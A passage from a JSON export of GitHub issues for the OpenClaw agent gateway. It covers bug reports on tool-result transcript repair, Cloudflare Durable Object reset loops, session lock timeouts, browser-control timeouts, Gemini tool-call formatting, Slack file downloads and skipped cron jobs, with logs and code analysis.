~/.openclaw/agents/main/sessions/sessions.json > /tmp/fixed.json\nmv /tmp/fixed.json ~/.openclaw/agents/main/sessions/sessions.json\n\n# Restart\nsystemctl --user start openclaw-gateway\n```\n\nThis suggests the \"synthetic error result for transcript repair\" mechanism doesn't handle all edge cases — specifically when a `web_search` tool call's result is never recorded.\n\n---\n\n### Code analysis (potential root cause)\n\nI dug into the source code to understand why the repair mechanism failed:\n\n**1. The repair mechanism exists and SHOULD work** (`src/agents/session-transcript-repair.ts`):\n```typescript\n// repairToolUseResultPairing() at line 166\n// - Iterates through messages\n// - For each assistant with tool calls, finds matching tool_results\n// - Inserts synthetic error results for any missing tool call IDs\n```\n\n**2. The session guard tracks pending tools** (`src/agents/session-tool-result-guard.ts`):\n```typescript\n// installSessionToolResultGuard() at line 45\n// - Maintains an in-memory `pending` Map of unresolved tool call IDs\n// - flushPendingToolResults() writes synthetic results before session ends\n// - Called in `finally` blocks (attempt.ts:906, compact.ts:462)\n```\n\n**3. Repair IS enabled for Anthropic** (`src/agents/transcript-policy.ts:104`):\n```typescript\nconst repairToolUseResultPairing = isGoogle || isAnthropic; // ✓ true for claude-opus-4-5\n```\n\n**The gap:** The in-memory `pending` Map is lost if the gateway crashes hard (SIGKILL, OOM, network timeout without graceful shutdown). In that case:\n1. Tool call is written to transcript (tool_use persisted)\n2. Gateway dies before `flushPendingToolResults()` can write the synthetic result\n3. On restart, `repairToolUseResultPairing()` should catch this during `sanitizeSessionHistory()`...\n\n**Why didn't repair work?** Possible causes:\n- **Race condition**: Messages sent to API before `sanitizeSessionHistory()` completes\n- **Message index 617**: Very long conversation (350k tokens at 175% context) — possible edge case with large histories\n- **Transform ordering**: Something after repair strips/modifies the synthetic result\n- **Code path bypass**: Some session load paths might skip the sanitization\n\nThe repair code at `session-transcript-repair.ts:272-284` looks correct for inserting missing results. The bug may be in **when** or **if** this code is called during the actual error scenario."
        },
        {
          "id": 3863796174,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8643#issuecomment-3863796174",
          "createdAt": "2026-02-07T07:03:23Z",
          "updatedAt": "2026-02-07T07:03:53Z",
          "author": "realriplab",
          "body": "I am having the same issue now in my Mac Mini.\nmissing tool result in session history; inserted synthetic error result for transcript repair."
        },
        {
          "id": 3881370139,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8643#issuecomment-3881370139",
          "createdAt": "2026-02-11T00:03:43Z",
          "updatedAt": "2026-02-11T00:03:43Z",
          "author": "rodbland2021",
          "body": "We've been investigating this bug extensively and believe we've found the root cause — it's a race condition between pi-agent-core's auto-retry mechanism and the attempt lifecycle.\n\n**Root cause:** When an API error (e.g., `overloaded_error`) triggers pi-agent-core's auto-retry, `_resolveRetry()` fires on `message_end` (assistant message received) — **before tool execution completes** in the retried loop. This causes `waitForRetry()` to resolve early, the attempt returns, and the `finally` block in `attempt.ts` calls `flushPendingToolResults()` while tools are still in flight (or never executed). The flush inserts the synthetic error.\n\n**Evidence:** In a real production session, we observed only a **53ms gap** between a tool call being registered and the synthetic error being inserted. The tool (an exec command that normally takes 1-5 seconds) never had a chance to run.\n\n**Fix:** We submitted #13746 which adds `agent.waitForIdle()` before the flush to ensure the retry loop fully completes. We're currently testing this on a production VPS with multiple agents that were experiencing this bug regularly.\n\nThe existing PRs addressing this (#3622, #9855, #12487, #8294, #13282) treat symptoms (better repair logic, cleanup, prompt engineering) but don't address the underlying timing issue."
        }
      ]
    },
    {
      "number": 13745,
      "title": "Durable Object reset loop prevents gateway startup on Cloudflare Workers",
      "body": "## Issue\nWhen deploying OpenClaw to Cloudflare Workers with Durable Objects, rapid deployments (multiple deployments within 5-10 minutes) cause a reset loop that prevents the gateway from starting.\n\n## Error Messages\n```\nFailed to start process: Error: Durable Object reset because its code was updated.\n[PROXY] Failed to start Moltbot: Error: Durable Object reset because its code was updated.\n```\n\n## Environment\n- **Platform**: Cloudflare Workers with Durable Objects + Container bindings\n- **OpenClaw Version**: 2026.2.3-1\n- **Deployment**: Cloudflare Sandbox (Docker container with `openclaw gateway`)\n\n## Steps to Reproduce\n1. Deploy OpenClaw worker to Cloudflare\n2. Wait for gateway to start successfully\n3. Deploy again within 5 minutes (e.g., code change)\n4. Deploy a third time within another 5 minutes\n5. Observe: Gateway fails to start with \"Durable Object reset\" errors\n\n## Expected Behavior\nGateway should recover gracefully after deployment-triggered resets and start successfully within the timeout period (90 seconds).\n\n## Actual Behavior\n- The Durable Object enters a reset loop\n- Each startup attempt is interrupted by another reset\n- Gateway never becomes ready on port 18789\n- Process times out after 90 seconds\n- Only resolves after waiting 5-10+ minutes without any deployments\n\n## Impact\n- Production downtime during multiple deployments\n- Cannot do rapid iteration/bug fixes\n- Data is safe (R2 backup/restore works), but service is unavailable\n\n## Workaround\nWait 5-10 minutes between deployments to allow the Durable Object to fully stabilize.\n\n## Proposed Solutions\n1. Add better error handling for DO reset scenarios (retry with backoff)\n2. Detect reset-in-progress state and defer startup\n3. Document deployment best practices (batch changes, avoid rapid deploys)\n4. Consider using Workers `deploy_config.version_id` for gradual rollouts\n\n## Additional Context\nUsing R2 for persistent storage (config, skills, conversations). The R2 restore completes successfully before the reset occurs. The issue is purely with the Durable Object lifecycle during rapid code updates.\n\nRelated: This appears to be a Cloudflare platform limitation rather than an OpenClaw bug, but better handling would improve the deployment experience.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13745",
      "createdAt": "2026-02-11T00:01:33Z",
      "updatedAt": "2026-02-11T00:02:37Z",
      "author": "Batsirai",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881366761,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13745#issuecomment-3881366761",
          "createdAt": "2026-02-11T00:02:36Z",
          "updatedAt": "2026-02-11T00:02:36Z",
          "author": "Batsirai",
          "body": "Wrong repo - this is a Cloudflare Workers Durable Object issue, not an OpenClaw core issue. Moving to the appropriate repo."
        }
      ]
    },
    {
      "number": 13744,
      "title": "Make session write lock configurable + narrow lock scope (avoid timeout=All models failed)",
      "body": "### Problem\nOpenClaw uses a file lock `${sessionFile}.lock` for session writes. In current build (npm `openclaw@2026.2.9`), the lock defaults are:\n- `timeoutMs = 10000` (10s)\n- `staleMs = 30min`\n\nHowever, call sites invoke it without overrides:\n- `acquireSessionWriteLock({ sessionFile })`\nso `timeoutMs/staleMs` are effectively hardcoded defaults and not configurable via `openclaw.json`.\n\nAdditionally, the lock appears to be held across a broad portion of the embedded run (including LLM/tool execution), not just during the actual transcript append/flush. Under concurrent inbound messages to the same session, this produces:\n- `Error: session file locked (timeout 10000ms)`\n- which then propagates as `All models failed` / failover, even though this is not a model/provider error.\n\n### Why it matters\nIf two channels (e.g., Telegram + Webchat) end up hitting the same session concurrently, the second request times out after 10s and fails the run, causing user-visible outages. This is concurrency/locking contention, not provider failure.\n\n### Requested changes\n1) **Configurable lock timeouts**\n   - Allow configuring `sessionWriteLock.timeoutMs` and `sessionWriteLock.staleMs` via `openclaw.json` (global defaults), and/or via env.\n\n2) **Narrow lock scope**\n   - Hold the lock only during critical sections that read/repair/prewarm/append to the session file.\n   - Avoid holding the lock across the entire LLM run.\n   - Alternative: per-session async queue / single-writer actor to serialize writes without blocking the whole run.\n\n3) **Better error handling**\n   - Distinguish lock-timeout from model/provider failures.\n   - Prefer a retry/backoff or a graceful `409/429`-style response with “please retry” instead of surfacing `All models failed`.\n\n### Evidence (from dist bundle)\nIn `dist/reply-*.js`:\n- Defaults inside `acquireSessionWriteLock()` include `timeoutMs ?? 1e4` and `staleMs ?? 1800*1e3`.\n- Multiple call sites use `acquireSessionWriteLock({ sessionFile })` (no overrides).\n- The lock is acquired early and released after the run finishes.\n\n### Workarounds we are using\n- External cleanup of PID-dead `.jsonl.lock` files.\n- Avoiding cross-channel contention by ensuring different channels don’t share the same sessionId.\n\nHappy to provide exact line snippets from the bundle if you want, or test a PR.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13744",
      "createdAt": "2026-02-10T23:56:35Z",
      "updatedAt": "2026-02-10T23:56:35Z",
      "author": "ruslanavapro",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 10994,
      "title": "[Bug]: Isolated OpenClaw browser (Brave) frequently becomes unreachable during automation (“browser control service timed out”), sometimes leaving CDP port stuck",
      "body": "## Summary\n\nWhen Openclaw runs automated steps in the OpenClaw-managed isolated browser (Brave), the browser automation often stops mid-task. The agent reports it “can’t reach the openclaw browser control service (timed out after 15000ms)” even though the gateway is still running and openclaw gateway status shows RPC probe OK. In some cases, the CDP port (18800) ends up stuck “in use,” requiring manual cleanup.\n\n\n## Steps to reproduce\n1. Start the isolated OpenClaw browser profile openclaw (Brave).\n2. Open Keap login (https://keap.com/login or redirect via keap.com (http://keap.com/) “Log in”). but its any site really.\n3. Perform a few automated actions (navigate, click buttons, fill fields).\n4. After some actions, automation fails with the “browser control service timed out” error and stops.\n\n## Expected behavior\nWhat did you expect to happen?• browser.start reliably launches and keeps the isolated Brave automation session controllable.\n• Normal navigation/clicking shouldn’t cause the browser control channel to become unreachable.\n• If the browser crashes/closes, OpenClaw should detect it and recover cleanly.\nActual behavior / errors\n\n• During navigation or clicks:  • Can't reach the openclaw browser control service (timed out after 15000ms). Start (or restart) the OpenClaw gateway...\n\n• Sometimes after a failure:  • PortInUseError: Port 18800 is already in use.\n  • Only resolved by finding/killing the stray process holding 18800.\n\n## Actual behavior\n\n1. Start the isolated OpenClaw browser profile openclaw (Brave).\n2. Open Keap login (https://keap.com/login or redirect via keap.com (http://keap.com/) “Log in”).\n3. Perform a few automated actions (navigate, click buttons, fill fields).\n4. After some actions, automation fails with the “browser control service timed out” error and stops.\n\n## Environment\n• OS: Ubuntu 24.04 (noble)\n• OpenClaw version: 2026.1.29 (gateway running as systemd user service)\n• Browser: OpenClaw isolated browser profile openclaw (auto-detected Brave at /usr/bin/brave-browser)\n• CDP port: 18800 (openclaw profile)\n• Target website: its really any website we tried. but we used a logged in web app called keap.com. but stops on any site automation after a few loops.\n• Channel: Telegram bot\n\n##What we tried\n• Restarting the gateway (SIGUSR1 / openclaw gateway restart) sometimes temporarily helps.\n• Stopping/starting the browser profile.\n• Killing stray browser processes when port 18800 is stuck.\nLogs / artifacts\n\n• [openclaw-2026-02-06.log](https://github.com/user-attachments/files/25143414/openclaw-2026-02-06.log)\n• I can provide timestamps + excerpts around:  • Browser control service ready\n  • subsequent browser failed: Can't reach... timed out\n  • any PortInUseError: 18800\n\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10994",
      "createdAt": "2026-02-07T08:08:50Z",
      "updatedAt": "2026-02-10T23:54:49Z",
      "author": "normanlove222",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3871526056,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10994#issuecomment-3871526056",
          "createdAt": "2026-02-09T12:50:34Z",
          "updatedAt": "2026-02-09T12:50:34Z",
          "author": "vedtam",
          "body": "I can confirm the same issue on **Chrome** latest, still on Ubuntu (24 LTS). \n\nConfig:\n```\n  \"browser\": {\n    \"enabled\": true,\n    \"executablePath\": \"/usr/bin/google-chrome-stable\",\n    \"attachOnly\": false,\n    \"defaultProfile\": \"openclaw\"\n  },\n```\n\nErrors:\n```\n{\"0\":\"Invalid config at /home/vedtam/.openclaw/openclaw.json:\\\\n- plugins.entries.whatsapp: plugin not found: whatsapp\\n- plugins.entries.slack: plugin not found: slack\\n- plugins.slots.memory: plugin not found: memory-core\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:36:54.813Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:36:54.815Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service. Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again. (Error: Error: tab not found)\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:39:55.107Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:39:55.107Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service. Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again. (Error: Error: tab not found)\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:39:55.110Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42:14\",\"fileName\":\"exec-HEWTMJ7j.js\",\"fileNameWithLine\":\"exec-HEWTMJ7j.js:42\",\"fileColumn\":\"14\",\"fileLine\":\"42\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42\",\"method\":\"logError\"}},\"time\":\"2026-02-09T12:39:55.111Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:42:02.603Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:42:02.603Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:42:02.605Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42:14\",\"fileName\":\"exec-HEWTMJ7j.js\",\"fileNameWithLine\":\"exec-HEWTMJ7j.js:42\",\"fileColumn\":\"14\",\"fileLine\":\"42\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42\",\"method\":\"logError\"}},\"time\":\"2026-02-09T12:42:02.605Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service. Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again. (Error: Error: Element \\\"e43\\\" not found or not visible. Run a new snapshot to see current page elements.)\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:43:01.797Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:43:01.798Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service. Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again. (Error: Error: Element \\\"e43\\\" not found or not visible. Run a new snapshot to see current page elements.)\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:43:01.804Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42:14\",\"fileName\":\"exec-HEWTMJ7j.js\",\"fileNameWithLine\":\"exec-HEWTMJ7j.js:42\",\"fileColumn\":\"14\",\"fileLine\":\"42\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42\",\"method\":\"logError\"}},\"time\":\"2026-02-09T12:43:01.806Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:44:31.532Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:44:31.534Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:44:31.539Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42:14\",\"fileName\":\"exec-HEWTMJ7j.js\",\"fileNameWithLine\":\"exec-HEWTMJ7j.js:42\",\"fileColumn\":\"14\",\"fileLine\":\"42\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42\",\"method\":\"logError\"}},\"time\":\"2026-02-09T12:44:31.541Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:44:43.666Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638:68\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:638\",\"fileColumn\":\"68\",\"fileLine\":\"638\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:638\",\"method\":\"console.error\"}},\"time\":\"2026-02-09T12:44:43.667Z\"}\n{\"0\":\"[tools] browser failed: Can't reach the OpenClaw browser control service (timed out after 20000ms). Start (or restart) the OpenClaw gateway (OpenClaw.app menubar, or `openclaw gateway`) and try again.\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"24.13.0\",\"hostname\":\"unknown\",\"name\":\"openclaw\",\"date\":\"2026-02-09T12:44:43.673Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42:14\",\"fileName\":\"exec-HEWTMJ7j.js\",\"fileNameWithLine\":\"exec-HEWTMJ7j.js:42\",\"fileColumn\":\"14\",\"fileLine\":\"42\",\"filePath\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js\",\"filePathWithLine\":\".nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/exec-HEWTMJ7j.js:42\",\"method\":\"logError\"}},\"time\":\"2026-02-09T12:44:43.674Z\"}\n```\nException that kills the browser at after a while:\n```\n[openclaw] Uncaught exception: Error: write EPIPE\n    at afterWriteDispatched (node:internal/stream_base_commons:159:15)\n    at writeGeneric (node:internal/stream_base_commons:150:3)\n    at Socket._writeGeneric (node:net:966:11)\n    at Socket._write (node:net:978:8)\n    at writeOrBuffer (node:internal/streams/writable:570:12)\n    at _write (node:internal/streams/writable:499:10)\n    at Writable.write (node:internal/streams/writable:508:10)\n    at restartSystemdService (file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/systemd-8sIc6isV.js:389:9)\n    at process.processTicksAndRejections (node:internal/process/task_queues:103:5)\n    at async Object.restart (file:///home/vedtam/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/dist/service-_JwSmGSn.js:641:4)\n```"
        }
      ]
    },
    {
      "number": 13742,
      "title": "[Bug]:",
      "body": "# Bug Report: Model Tool-Call Hallucination (Pro Model Specific)\n\n## Description\nThe model occasionally fails to invoke tools using the proper function-calling protocol. Instead, it outputs raw JSON blocks mimicking the tool call directly into the chat response.\n\n## Observation\n- **Model Output:** Raw JSON text inside code blocks.\n- **Affected Model:** google-gemini-cli/gemini-3-pro-preview\n- **Working Model:** google-gemini-cli/gemini-3-flash-preview (issue NOT observed here)\n\n## Impact\nThe 'Pro' model occasionally reverts to generating raw JSON text in the middle of long-running sessions, while the 'Flash' model remains stable. This suggests a regression or difference in instruction following between versions.\n\n## Environment\n- **OpenClaw Version:** 2026.2.9\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13742",
      "createdAt": "2026-02-10T23:54:20Z",
      "updatedAt": "2026-02-10T23:54:20Z",
      "author": "lowcoster30-tech",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13740,
      "title": "[Bug]: Slack file downloads fail for files-pri URLs (receives HTML redirect instead of file)",
      "body": "When a Slack user shares a file in a DM/channel, OpenClaw downloads the Slack login redirect page (HTML) instead of the actual file content.\n\nSteps to Reproduce\n\n1. Configure Slack channel with files:read scope on bot token\n2. User shares a PDF file in a DM with the bot\n3. OpenClaw receives the message with file metadata\n4. File is \"downloaded\" to media store\nExpected Behavior\n\nFile should be downloaded with proper authentication and saved as the actual PDF.\n\nActual Behavior\n\n• Slack metadata shows: \"size\": 6928656 (6.9MB PDF)\n• OpenClaw saves: 53KB HTML file (Slack login redirect page)\n• File content starts with <!DOCTYPE html><html lang=\"en-US\"...\nRoot Cause (suspected)\n\nThe files-pri URL (`[https://files.slack.com/files-pri/T.../F.../filename.pdf`](https://files.slack.com/files-pri/T.../F.../filename.pdf%60)) requires the bot token in the Authorization header:\n\nAuthorization: Bearer xoxb-...\nThe download appears to be fetching without auth, causing Slack to return a login redirect.\n\nEnvironment\n\n• OpenClaw: 2026.2.3-1 (d84eb46)\n• Slack mode: Socket\n• Bot scopes include: files:read, files:write\nFile metadata from message\n\n{\n  \"id\": \"F0AF34ABSV6\",\n  \"name\": \"Animal Health 2031 Piper Equity Research Report.pdf\",\n  \"mimetype\": \"application/pdf\",\n  \"size\": 6928656,\n  \"url_private\": \"https://files.slack.com/files-pri/T.../F.../filename.pdf\"\n}",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13740",
      "createdAt": "2026-02-10T23:49:27Z",
      "updatedAt": "2026-02-10T23:49:27Z",
      "author": "dleffel",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13739,
      "title": "[Bug]: Daily cron jobs skip execution on v2026.2.9 (post-#10788 fix)",
      "body": "## Summary\n\nDaily cron jobs (once-per-day `cron` expressions) systematically skip their scheduled execution, with `nextRunAtMs` advancing 48 hours instead of 24 hours. This persists on v2026.2.9 (published Feb 9), which should include the fix from #10788 / PR #11641 (merged Feb 8).\n\n## Steps to reproduce\n\n1. Create multiple cron jobs with daily schedules (`0 6 * * *`, `30 6 * * 1-5`, `0 7 * * *`, `0 8 * * *`) in `Pacific/Honolulu` timezone\n2. Also have frequent `every`-type jobs running (e.g., every 15 minutes)\n3. Wait for scheduled daily execution times\n4. Check `cron list` — daily jobs show `nextRunAtMs` set ~48h after `lastRunAtMs`, having skipped today entirely\n\n## Expected behavior\n\nAll cron jobs fire at their scheduled times. `nextRunAtMs` advances by ~24h after each run.\n\n## Actual behavior\n\n**All once-daily cron expression jobs skip**, while frequent jobs work fine:\n\n✅ **Working** (frequent schedules):\n- `every` 15min jobs (auth guard, qmd-update)\n- `cron` jobs firing every 30min (`20,50 7-19 * * 1-5`)\n- `every` 4h job (1Password health)\n\n❌ **Skipped** (daily schedules):\n- `0 6 * * *` — Meeting Prep: 48h gap between lastRun and nextRun\n- `30 6 * * 1-5` — Slack Review: same 48h gap\n- `0 7 * * *` — TRMNL Ideas: same\n- `0 8 * * *` — Sleep Art, Key Age Counter: same\n- `0 7-22 * * *` — Hourly Email: missed 7 AM and 8 AM slots\n\n❌ **Never ran** (newly created jobs):\n- Two new jobs created ~3:30 PM, first eligible run that evening/next morning never fired. `nextRunAtMs` set to second occurrence.\n\n**Key observations:**\n- Gateway was running continuously overnight (no sleep, max log gap 28 min)\n- No errors in gateway logs for the missed jobs\n- Logs show `cron: timer armed` entries with `clamped: true` throughout the night\n- The scheduler successfully ran `every`-type and high-frequency cron jobs during the same period\n\n## Environment\n\n- OpenClaw version: 2026.2.9 (latest on npm)\n- OS: macOS Darwin 24.6.0 arm64 (Apple Silicon)\n- Install method: npm (homebrew prefix)\n- Node: v25.5.0\n- 18 cron jobs configured (mix of `every`, `cron`, and `at` types)\n\n## Source code analysis\n\nWe traced the scheduler logic in `gateway-cli-DqCmx-9c.js`:\n\n- `computeNextRunAtMs` for cron type calls `cron.nextRun(new Date(nowSecondMs - 1))` — returns next occurrence strictly after now\n- `recomputeNextRuns`: if `now >= nextRunAtMs`, recomputes to 